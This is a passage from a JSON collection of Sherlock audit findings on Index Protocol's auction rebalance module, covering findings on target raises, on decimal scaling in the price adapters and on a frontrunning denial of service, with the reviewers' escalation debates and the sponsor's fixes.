[requirements](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L918-L926)\n```solidity\nrequire(currentUnit != targetUnit, \"Target already met\");\n\n// Determine whether the component is being sold (sendToken) or bought\nisSellAuction = targetNotional < currentNotional;\n\n// Calculate the max quantity of the component to be exchanged. If buying, account for the protocol fees.\nmaxComponentQty = isSellAuction\n    ? currentNotional.sub(targetNotional)\n    : targetNotional.sub(currentNotional).preciseDiv(PreciseUnitMath.preciseUnit().sub(protocolFee));\n```\n\nTherefore, the best thing to do is wait till the discount on WBTC is suitable and every WBTC is munched on. Thereby reaching the goal of `20% USDC, 40% WBTC, 40% WETH`.\n\nExcess USDC means USDC is greater than 20%. And that also means either WBTC or WETH is less than 40% or both. And it is possible to be unable to bid cause targetUnit of WBTC and WETH has been reached. However, all target unit has not been reached because of USDC. The solution is to call startRebalance again and **update targetUnits** (and maybe price too is depending on what is considered fair price).\n\n\n\n**bizzyvinci**\n\nAn example of when to use `raiseAssetTargets`.\n\nAssuming USDC is quoteAsset but not a component. And we want WETH and WBTC to be 50 and 50 respectively.\n\nIf targetUnit and hence the 50:50 is reached and there's still USDC. We could use raiseAssetTarget to uniformly raise the target unit by 10% to 55:55. And that's still a 50% ratio for each component.\n\n\n**pblivin0x**\n\nI believe this is a valid medium\n\n**bizzyvinci**\n\nI still stand by my escalation because my argument is that the manager could call `startRebalance` at any point in time during an active auction. With this function `startRebalance`, they could change price, price curve, and target unit. Therefore no matter the unfavourable price, target unit or ratio, the manager has the option to call `startRebalance` instead of `raiseAssetTarget`.\n\nThe only reason a manager would call `raiseAssetTarget` instead of `startRebalance` is when \n* All target unit have been met\n* And they want to uniformly raise all the target units\n\nAnd (though it was not explicitly stated in the [docs](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L351))\n* manager is comfortable with the current price and direction. Cause if they are not, they could call `startRebalance` to update the price while raising all target units.\n\n\n**pblivin0x**\n\n> I still stand by my escalation because my argument is that the manager could call `startRebalance` at any point in time during an active auction. With this function `startRebalance`, they could change price, price curve, and target unit. Therefore no matter the unfavourable price, target unit or ratio, the manager has the option to call `startRebalance` instead of `raiseAssetTarget`.\n> \n> The only reason a manager would call `raiseAssetTarget` instead of `startRebalance` is when\n> \n> * All target unit have been met\n> * And they want to uniformly raise all the target units\n> \n> And (though it was not explicitly stated in the [docs](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L351))\n> \n> * manager is comfortable with the current price and direction. Cause if they are not, they could call `startRebalance` to update the price while raising all target units.\n\nUpon further review, I actually change my opinion, and agree with this escalation. \n\nI think that the listed remediation is not satisfactory and that it is on the SetToken manager to decide whether raiseAssetTargets or a fresh startRebalance call is preferable given their price curves. \n\n---\n\nAssume fair market prices of 1850 for ETH and 29000 for WBTC. \n\nSuppose we have a rebalance with the following individual component auctions\n+ An auction that sells WETH in exchange for DAI. Auction price begins at 2200 and lowers to a price of 1800. \n+ An auction that buys WBTC with DAI. Auction price begins at 25000 and raises to a price of 30000. \n\nNow suppose that the auctions fill, there are remaining DAI units, and both auction price curves have reached their final price (1800 and 30000). \n\nIf asset targets are raised, all auctions now become buy auctions. \n\nIf we do not reset `rebalanceStartTime` when we raise asset targets, we have\n+ Good: An auction that buys WETH with DAI at a price of 1800. This is below market value, unlikely to get filled, but not a risk for SetToken holders\n+ Bad: An auction that buys WBTC with DAI at a price of 30000. This is above market value, and a risk to SetToken holders to lose NAV\n\nIf we do reset `rebalanceStartTime` when we raise asset targets, we have\n+ Bad: An auction that buys WETH with DAI at a price of 2200. This is above market value, and a risk to SetToken holders to lose NAV\n+ Good: An auction that buys WBTC with DAI at a price of 25000. This is below market value, unlikely to get filled, but not a risk for SetToken holders\n\n---\n\nIn conclusion\n+ I agree with the stated vulnerability - `Target raises can be highly damaging for dutch auctions with multiple components`\n+ I disagree with the listed remediation - resetting the `rebalanceStartTime` does not automatically lead to proper pricing of the component auctions, because sell auctions have flipped to buy auctions on the target raise. \n+ I agree with the escalation - It is on the SetToken manager to decide whether their auction price curves are appropriate for a nonzero `raiseTargetPercentage`. If it is not appropriate, then they need to call a fresh `startRebalance()`. \n\n\n\n\n**bizzyvinci**\n\n`raiseAssetTargets` is for when you are buying all components (those listed for bidding) and you want to sell `quoteAsset` till it reaches 0 or a specified limit. This was also mentioned in the [docs](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L353) (@pblivin0x could update docs if the wordings are not clear enough for most users)\n\n> This helps in reducing tracking error and providing greater granularity in reaching an equilibrium between the excess quote asset and the components to be purchased.\n\n**hrishibhat**\n\nAdditional Sponsor comment:\n> confirming i see this as a low. manager needs to decide between proper calls (setTargetRaisePercentage or startRebalance) based on the AuctionExecutionParams they inputted\n\n\n**pblivin0x**\n\nThis issue's remediation has been removed from https://github.com/IndexCoop/index-protocol/pull/25 pending escalation resolution\n\n**IAm0x52**\n\nI disagree that this is admin's responsibility. The feature is dangerous in this scenario. There is no \"safe\" parameter that admin can use. Their only option is to not use the feature, which I don't think is a valid. It also has to be considered that the admin can't turn off rebalances after they have been enabled. I still hold this is a valid medium. #44 also provides another way this can be abused. I know that sponsor has commented that donation doesn't work but the donation occurs before the buy which causes the donated balance to be counted and to reflect in the set token balances when it updates the balances of the set token. Both this and #44 have the same root cause (not resetting the price after increase) which is why I didn't escalate that one.\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nAlthough the suggested remediation does not solve the problem the issue identified is valid. \nSponsor:\n> I agree with the stated vulnerability - Target raises can be highly damaging for dutch auctions with multiple components\n\nAdditional Sponsor comment:\n> raising asset targets is a legacy feature from the GeneralIndexModule, and as your issue correctly points out, it doesnt really make sense with dutch auctions\n\n> i am fine with any issue validity ruling here.\n\nConsidering this a valid medium based on the additional sponsor comment and the Lead Watson [comment](https://github.com/sherlock-audit/2023-06-Index-judging/issues/45#issuecomment-1672156329)\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [bizzyvinci](https://github.com/sherlock-audit/2023-06-Index-judging/issues/45/#issuecomment-1659916781): rejected",
      "summary": "\nThis bug report is about a vulnerability found in the AuctionRebalanceModuleV1 of the Index Protocol. The vulnerability is that multi-component Dutch auctions are incompatible with target raises and can lead to inefficient pricing, causing losses to the Set Token. This is because when a target raise is enabled, it is highly likely that the pricing of some components will be heavily skewed from market prices. \n\nThe code snippet linked in the report shows the `raiseAssetTarget` function, which is meant for uniformly raising targets when all target units have been met. Other factors such as price and ratio can be resolved by calling `startRebalance`. \n\nThe discussion in the comments section provided various examples of when to use `raiseAssetTargets` and when to call `startRebalance`. For instance, if the manager wants to move from 40% USDC, 30% WBTC, 30% WETH to 20% USDC, 40% WBTC, 40% WETH using USDC, they can call `startRebalance` to update the prices and target units. \n\nThe lead Watson and sponsor agreed that the vulnerability is valid and should be considered a medium. The suggested remediation does not solve the problem, and it is up to the SetToken manager to decide whether `raiseAssetTargets` or a fresh `startRebalance` call is preferable given their price curves. The sponsor comment also noted that `raiseAssetTargets` is a legacy feature from the GeneralIndexModule and does not make sense with Dutch auctions. \n\nUltimately, the escalation was rejected, and the issue's remediation has been removed from the Index Protocol pending resolution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/45",
      "tags": [
        "Missing-Logic",
        "Auction"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20908",
      "title": "M-5: Exponential and logarithmic price adapters will return incorrect pricing when moving from higher dp token to lower dp token",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/42 \n\n## Found by \n0x52\n## Summary\n\nThe exponential and logarithmic price adapters do not work correctly when used with token pricing of different decimal places. This is because the resolution of the underlying expWad and lnWad functions is not fit for tokens that aren't 18 dp.\n\n## Vulnerability Detail\n\n[AuctionRebalanceModuleV1.sol#L856-L858](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L856-L858)\n\n    function _calculateQuoteAssetQuantity(bool isSellAuction, uint256 _componentQuantity, uint256 _componentPrice) private pure returns (uint256) {\n        return isSellAuction ? _componentQuantity.preciseMulCeil(_componentPrice) : _componentQuantity.preciseMul(_componentPrice);\n    }\n\nThe price returned by the adapter is used directly to call _calculateQuoteAssetQuantity which uses preciseMul/preciseMulCeil to convert from component amount to quote amount. Assume we wish to sell 1 WETH for 2,000 USDT. WETH is 18dp while USDT is 6dp giving us the following price:\n\n    1e18 * price / 1e18 = 2000e6\n\nSolving for price gives:\n\n    price = 2000e6\n\nThis establishes that the price must be scaled to:\n\n    price dp = 18 - component dp + quote dp\n\nPlugging in our values we see that our scaling of 6 dp makes sense.\n\n[BoundedStepwiseExponentialPriceAdapter.sol#L67-L80](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L67-L80)\n\n        uint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\n        // Protect against priceChange overflow\n        if (scalingFactor > type(uint256).max / expExpression) {\n            return _getBoundaryPrice(isDecreasing, maxPrice, minPrice);\n        }\n        uint256 priceChange = scalingFactor * expExpression - WAD;\n\n        if (isDecreasing) {\n            // Protect against price underflow\n            if (priceChange > initialPrice) {\n                return minPrice;\n            }\n            return FixedPointMathLib.max(initialPrice - priceChange , minPrice);\n\nGiven the pricing code and notably the simple scalingFactor it also means that priceChange must be in the same order of magnitude as the price which in this case is 6 dp. The issue is that on such small scales, both lnWad and expWad do not behave as expected and instead yield a linear behavior. This is problematic as the curve will produce unexpected behaviors under these circumstances selling the tokens at the wrong price. Since both functions are written in assembly it is very difficult to determine exactly what is going on or why this occurs but testing in remix gives the following values:\n\n    expWad(1e6) - WAD = 1e6\n    expWad(5e6) - WAD = 5e6\n    expWad(10e6) - WAD = 10e6\n    expWad(1000e6) - WAD = 1000e6\n\nAs seen above these value create a perfect linear scaling and don't exhibit any exponential qualities. Given the range of this linearity it means that these adapters can never work when selling from higher to lower dp tokens. \n\n## Impact\n\nExponential and logarithmic pricing is wrong when tokens have mismatched dp\n\n## Code Snippet\n\n[BoundedStepwiseExponentialPriceAdapter.sol#L28-L88](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L28-L88)\n\n[BoundedStepwiseLogarithmicPriceAdapter.sol#L28-L88](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseLogarithmicPriceAdapter.sol#L28-L88)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nscalingFactor should be scaled to 18 dp then applied via preciseMul instead of simple multiplication. This allows lnWad and expWad to execute in 18 dp then be scaled down to the correct dp.\n\n\n\n## Discussion\n\n**pblivin0x**\n\nAgree that scalingFactor should be 18 decimals and applied with preciseMul, will fix. \n\n**Oot2k**\n\nNot a duplicate \n\n**bizzyvinci**\n\nEscalate\n\nThis is invalid\n\n`FixedPointMathLib.expWad` and `FixedPointMathLib.lnWad` uses WAD as input and WAD as output. This is mentioned in [docs](https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol#L120) and you can test it out on remix. Therefore, `exp(1) = FixedPointMathLib.expWad(WAD) / WAD` and `exp(5) = FixedPointMathLib.expWad(5*WAD) / WAD`.\n\n`expWad(1e6) - WAD = 1e6` is equal to `exp(1e-12) - 1 = 1e-12` which is absolutely correct.\n\nFor the formula to work, timeCoefficient has to be in WAD. @pblivin0x  should look at our DM around this time.\n\n<img width=\"840\" alt=\"Screenshot 2023-08-01 at 09 46 44\" src=\"https://github.com/sherlock-audit/2023-06-Index-judging/assets/22333930/1b224171-5a20-4836-95f6-3ed78078dda0\">\n\n\nHis comment: `scalingFactor should be 18 decimals and applied with preciseMul` is on a different matter. It's a plan for the future to allow decimal scalingFactor e.g 0.5, 2.5 rather than just integers like 1, 2, 3 etc.\n\nTo recap: \n`block.timestamp` is in seconds, therefore `timeBucket`, `_timeElapsed` and `bucketSize` are in seconds.\n`_componentPrice`, `initialPrice`, `minPrice`, `maxPrice`, `priceChange` and `FixedPointMathLib` are in WAD.\nTherefore, `expExpression`, `expArgument` and `timeCoefficient` has to also be in WAD.\n`scalingFactor` is just a scaler unit which the team plan to turn into WAD in the future for more precision with scaling.\n\n\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is invalid\n> \n> `FixedPointMathLib.expWad` and `FixedPointMathLib.lnWad` uses WAD as input and WAD as output. This is mentioned in [docs](https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol#L120) and you can test it out on remix. Therefore, `exp(1) = FixedPointMathLib.expWad(WAD) / WAD` and `exp(5) = FixedPointMathLib.expWad(5*WAD) / WAD`.\n> \n> `expWad(1e6) - WAD = 1e6` is equal to `exp(1e-12) - 1 = 1e-12` which is absolutely correct.\n> \n> For the formula to work, timeCoefficient has to be in WAD. @pblivin0x  should look at our DM around this time.\n> \n> <img width=\"840\" alt=\"Screenshot 2023-08-01 at 09 46 44\" src=\"https://github.com/sherlock-audit/2023-06-Index-judging/assets/22333930/1b224171-5a20-4836-95f6-3ed78078dda0\">\n> \n> \n> His comment: `scalingFactor should be 18 decimals and applied with preciseMul` is on a different matter. It's a plan for the future to allow decimal scalingFactor e.g 0.5, 2.5 rather than just integers like 1, 2, 3 etc.\n> \n> To recap: \n> `block.timestamp` is in seconds, therefore `timeBucket`, `_timeElapsed` and `bucketSize` are in seconds.\n> `_componentPrice`, `initialPrice`, `minPrice`, `maxPrice`, `priceChange` and `FixedPointMathLib` are in WAD.\n> Therefore, `expExpression`, `expArgument` and `timeCoefficient` has to also be in WAD.\n> `scalingFactor` is just a scaler unit which the team plan to turn into WAD in the future for more precision with scaling.\n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nSince scaling factor is not applied via precise mul in the current implementation, in order to work as the code is written it has to be have the same number of decimals as price and therefore can't be WAD, regardless of what sponsor has said in the discord comments. As I've shown in my issue these smaller values are not compatible with expWAD and lnWAD and will produce incorrect values, negatively affecting auction pricing. \n\n**bizzyvinci**\n\nThe [getPrice function](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L28-L88) can be broken down to the following after removing `boundary price` and type conversions.\n\n1. timeBucket = _timeElapsed / bucketSize\n2. expArgument = timeCoefficient * timeBucket\n3. expExpression = FixedPointMathLib.expWad(expArgument)\n4. priceChange = scalingFactor * expExpression - WAD\n5. price = initialPrice + priceChange (or minus)\n\nTo know what unit should be WAD or not, we need to look elsewhere.\n1. `_timeElapsed = block.timestamp - rebalanceInfo[_setToken].rebalanceStartTime` [here](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L806) and `rebalanceInfo[_setToken].rebalanceStartTime` is set to `block.timestamp` when startRebalance is called [here](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L275). Therefore `_timeElapsed`, `bucketSize` and `timeBucket` has to be seconds.\n2. `_componentPrice` is in precise unit or WAD based on calculation [here](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L857). Therefore `price`, `initialPrice` and `priceChange` have to also be in WAD.\n3. Formula 4 is wrong as pointed out in #39 therefore let's just focus on the multiplication part and assume `priceChange = scalingFactor * expExpression`. If `priceChange` is `WAD`, then `scalingFactor * expExpression` has to be WAD. Either `scalingFactor is WAD` or `expExpression` is WAD.\n4. FixedPointMathLib.expWad returns WAD, so `expExpression` is indeed WAD. So `scalingFactor` is basic unit.\n5. Furthermore, `FixedPointMathLib.expWad` takes WAD as input, and that input is `timeCoefficient * timeBucket`. We've established that `timeBucket` is seconds in 1, so therefore `timeCoefficient` has to be WAD.\n\nThe sponsor's message was referenced because \n* I was the one who decided that his initial statement `timeCoefficient and bucketSize are not in WAD` is wrong. So he might want to cross-check things again.\n* We had some discussions about scalingFactor and converting it to WAD around that time.\n\nIf scalingFactor is changed to WAD, then priceChange would be `WAD^2`. Therefore, we must use preciseMul to keep things balanced again. P.S: -WAD is ignored again.\n```solidity\n+ priceChange = scalingFactorWAD.preciseMul(expExpression)\n- priceChange = scalingFactorBasic * expExpression\n```\n\nThe 2 formula are the same thing because `preciseMul(a, b) = a * b / WAD` [code](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/lib/PreciseUnitMath.sol#L94-L96)\n```solidity\nfunction preciseMul(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a.mul(b).div(PRECISE_UNIT);\n}\n```\n\n**IAm0x52**\n\n> _componentPrice is in precise unit or WAD based on calculation [here](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L857). Therefore price, initialPrice and priceChange have to also be in WAD.\n\nThis is incorrect. I've proven in my submission above that when going from an 18 dp token to 6 dp that price has to be 6 dp. Since scalingFactor is applied as a scaler and not via preciseMul then expArgument and expExpression have to also be in 6 dp as well. If you used a WAD expression for them the pricing would be completely wrong as it would return an 18 dp price. As I've shown expWAD returns incorrectly when inputting a 6 dp number.\n\n**IAm0x52**\n\nThe point of this issue is to prove that scaling factor must be applied via preciseMul or else the price cannot work as expect. To just say \"scaling factor should be applied via preciseMul\" is not a valid issue unless you can show why it's incorrect that it's not applied that way and the damages that it causes. \n\n**bizzyvinci**\n\nprecise unit is used for precision in calculation because the numbers could be very small and solidity does automatic rounding. When multiplying or dividing, preciseMul or preciseDiv is used to finally get rid of that precision. You can view the [PreciseUnitMath library](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/lib/PreciseUnitMath.sol) and the key take away are\n1. `PRECISE_UNIT = PRECISE_UNIT_INT = WAD = 1e18`\n2. `preciseMul(a, b) = a * b / WAD` and that only makes sense if a or b is WAD\n3. `preciseDiv(a, b) = a * WAD / b` and that only makes sense if b is WAD\n\nNow, why is `_componentPrice` in WAD? \nBecause `_componentQuantity` and the returned `quoteAssetQuantity` are not in WAD and preciseMul needs `b` to be WAD. `_componentQuantity` and `quoteAssetQuantity` are the raw quantity amount that would be transferred with `token.transfer`.\n\nhttps://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L856-858\n```solidity\nfunction _calculateQuoteAssetQuantity(bool isSellAuction, uint256 _componentQuantity, uint256 _componentPrice) private pure returns (uint256) {\n      return isSellAuction ? _componentQuantity.preciseMulCeil(_componentPrice) : _componentQuantity.preciseMul(_componentPrice);\n  }\n```\n\n\n**pblivin0x**\n\nI believe this is a valid medium\n\n**Oot2k**\n\nI agree that this is valid medium\n\n**bizzyvinci**\n\nI still stand by my escalation and I think my proof is sufficient cause it proves the following\n* _componentPrice in WAD\n* Right now, scalingFactor is not WAD cause that would be mathematically wrong. It must be a normal integer.\n* The unit of each parameters (e.g which one is seconds, WAD or int) to show that price does work correctly.\n* The team plans to make scalingFactor WAD and use preciseMul. They **must** use preciseMul to make sure priceChange remains a WAD (rather than WAD^2)\n* The migration of scalingFactor from integer scalar to WAD scalar **would not** change price nor priceChange because `preciseMul(a,b) = a * b / WAD`\n* The only effect the migration has is precision. scalingFactor could then be represented as decimals instead of just integers. \n\n\nIf anyone disagrees it would be nice if they state why. Or if there's a point that wasn't clear, I'm here to clarify.\n\n**bizzyvinci**\n\nI understand the proof might be daunting to comprehend so I'll recommend using pen and paper (and maybe remix with calculator) to make things easier.\n\n**bizzyvinci**\n\nI do agree that my escalation be rejected\n\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nConsidering this a valid medium based on the above comments. \n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [bizzyvinci](https://github.com/sherlock-audit/2023-06-Index-judging/issues/42/#issuecomment-1659888928): rejected\n\n**pblivin0x**\n\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\n\nThe changes are to update to 18 decimal `scalingFactor` in both the exponential and logarithmic adapter\n+ https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73\n+ https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/integration/auction-price/BoundedStepwiseLogarithmicPriceAdapter.sol#L73",
      "summary": "\nThis bug report is about the Exponential and Logarithmic Price Adapters which are used to convert token pricing of different decimal places. It was found by 0x52 and reported on GitHub. The issue is that when moving from higher dp token to lower dp token, the adapters do not work correctly due to the resolution of the underlying expWad and lnWad functions not being fit for tokens that aren't 18 dp. This is because the price returned by the adapter is used directly to call _calculateQuoteAssetQuantity which uses preciseMul/preciseMulCeil to convert from component amount to quote amount and the resolution of the functions is not suitable for smaller values.\n\nTesting in Remix showed that these functions produce a perfect linear scaling instead of an exponential one, meaning that the adapters can never work when selling from higher to lower dp tokens. As a result, exponential and logarithmic pricing is wrong when tokens have mismatched dp.\n\nThe team plan to turn scalingFactor into WAD in the future for more precision with scaling, and use preciseMul instead of simple multiplication. This would allow lnWad and expWad to execute in 18 dp then be scaled down to the correct dp.\n\nThe bug report was discussed and it was agreed that this is a valid medium issue. The team plan to fix it by turning scalingFactor into WAD in the future and using preciseMul instead of simple multiplication.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/42",
      "tags": [
        "Wrong Math",
        "Decimals",
        "Assembly"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20907",
      "title": "M-4: Full inventory asset purchases can be DOS'd via frontrunning",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/41 \n\n## Found by \n0x52, Arabadzhiev\n## Summary\n\nUsers who attempt to swap the entire component value can be frontrun with a very small bid making their transaction revert\n\n## Vulnerability Detail\n\n[AuctionRebalanceModuleV1.sol#L795-L796](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L795-L796)\n\n        // Ensure that the component quantity in the bid does not exceed the available auction quantity.\n        require(_componentQuantity <= bidInfo.auctionQuantity, \"Bid size exceeds auction quantity\");\n\nWhen creating a bid, it enforces the above requirement. This prevents users from buying more than they should but it is also a source of an easy DOS attack. Assume a user is trying to buy the entire balance of a component, a malicious user can frontrun them buying only a tiny amount. Since they requested the entire balance, the call with fail. This is a useful technique if an attacker wants to DOS other buyers to pass the time and get a better price from the dutch auction.\n\n## Impact\n\nMalicious user can DOS legitimate users attempting to purchase the entire amount of component\n\n## Code Snippet\n\n[AuctionRebalanceModuleV1.sol#L772-L836](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L772-L836)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow users to specify type(uint256.max) to swap the entire available balance\n\n\n\n## Discussion\n\n**pblivin0x**\n\nThe recommendation here is that we allow `componentQuantity` to be specified in excess of the auction size? so replace the current check\n\n```solidity\n// Ensure that the component quantity in the bid does not exceed the available auction quantity.\nrequire(_componentQuantity <= bidInfo.auctionQuantity, \"Bid size exceeds auction quantity\");\n```\n\nwith a enforced cap\n\n```solidity\nif (_componentQuantity > bidInfo.auctionQuantity) {\n    _componentQuantity = bidInfo.auctionQuantity;\n}\n```\n\nI was originally hesitant because of some unintuitive UX, but if this removes the potential for a DOS attack, i think it is worth implementing.\n\n**FlattestWhite**\n\nHmmm we should probably allow user to specify `maxQuantity` rather than the absolute quantity they want to buy\n\n**snake-poison**\n\n> The recommendation here is that we allow `componentQuantity` to be specified in excess of the auction size? so replace the current check\n> \n> ```solidity\n> // Ensure that the component quantity in the bid does not exceed the available auction quantity.\n> require(_componentQuantity <= bidInfo.auctionQuantity, \"Bid size exceeds auction quantity\");\n> ```\n> \n> with a enforced cap\n> \n> ```solidity\n> if (_componentQuantity > bidInfo.auctionQuantity) {\n>     _componentQuantity = bidInfo.auctionQuantity;\n> }\n> ```\n> \n> I was originally hesitant because of some unintuitive UX, but if this removes the potential for a DOS attack, i think it is worth implementing.\n\nI believe what the submitter was recommending was something more akin to keeping the :\n\n```solidity\n if (_componentQuantity == type(uint256).max) {\n     _componentQuantity = bidInfo.auctionQuantity;\n} else {\nrequire(_componentQuantity <= bidInfo.auctionQuantity, \"Bid size exceeds auction quantity\");\n}\n```\n\nnote: the difference in gas is trivial, but it isn't equivalent to your suggestion so I wanted to point it out. My examples assumes pragma > 0.7 to use the type().max syntax but the older idiomatic `uint256(-1) ` would.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Severity should not be Medium, has to be low or invalid, because there is no incentive at all for front-runners and also based on Sherlock's documentation, DOS < 1yr is not a valid one.\n\nThe escalation could not be created because you are not exceeding the escalation threshold.\n\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page,\nin the [Sherlock webapp](https://app.sherlock.xyz/audits/).\n\n\n**JJtheAndroid**\n\nEscalate\n\nThis issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk. \n\n**sherlock-admin2**\n\n > Escalate\n> \n> This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk. \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Arabadzhiew**\n\n> Escalate\n> \n> This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\n\nCan't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\n\n**JJtheAndroid**\n\n> > Escalate\n> > This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\n> \n> Can't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\n\n\n\nIn your scenario, users can only prolong it as long the current price is higher than min price. Malicious front running is useless beyond that point, because the price cannot go any lower. This would be invalid as per Sherlock rules on DOS attacks.\n\n\nThe unintentional scenario is not a DOS, it is just multiple people bidding at the same time. This is by design.\n\n\nAgain, no user funds are at risk. This should not be a med\n\n**IAm0x52**\n\n> Can't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\n\nAgreed with this. Given the nature of a dutch auction, the temporary DOS will prevent the auction from executing as expected and lead to assets being sold under market value.\n\n**pblivin0x**\n\nI agree this is a valid Medium\n\n**0xauditsea**\n\nvalid Medium? \n\n**0xauditsea**\n\nHere's the docs about the severity of DOS: https://docs.sherlock.xyz/audits/judging/judging\n\n![image](https://github.com/sherlock-audit/2023-06-Index-judging/assets/133329604/6df6248c-d3d7-4a2b-8e7e-67d4598d44fd)\n\nHope this helps in escalation! Thanks y'all! \n\n**hrishibhat**\n\n@0xauditsea @JJtheAndroid \nThere seems to be some confusion about the rule for DOS. Funds not being accessible temporarily does not apply here. \nHere the DOS results in loss of funds which is considered to be a medium:\n> Agreed with this. Given the nature of a dutch auction, the temporary DOS will prevent the auction from executing as expected and lead to assets being sold under market value.\n\n**0xauditsea**\n\n@hrishibhat - Why is there loss of funds at all? The auction has minimum price defined which can be lower than the market value, that's totally fine for users to buy tokens with lower price, it's benefit for users, acceptable for auction manager.\n\n**hrishibhat**\n\n@pblivin0x @0xauditsea \nCorrect me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\n\n\n**hrishibhat**\n\nTo add to my comment: \nthe Max min values are values that are acceptable by the manager if the users decide to bid for the value within that range. \nThat does not mean the code should unfairly allow someone to stop a higher bid and bid at a lower price. This seems like valid issue that does not allow normal functioning of dutch auction. \n\n**0xauditsea**\n\n@hrishibhat - In selling auction (users buy component), component price goes lower as time goes. So when it's front-run, the user will try again with lower price, which is fine for the user, also no problem with the auction manager.\n\n**0xauditsea**\n\nThis is basically not loss of funds.\n\n**JJtheAndroid**\n\n> To add to my comment: the Max min values are values that are acceptable by the manager if the users decide to bid for the value within that range. That does not mean the code should unfairly allow someone to stop a higher bid and bid at a lower price. This seems like valid issue that does not allow normal functioning of dutch auction.\n\nI don't want to go back and forth on this. I just want to say that your description is inaccurate. The report does not describe 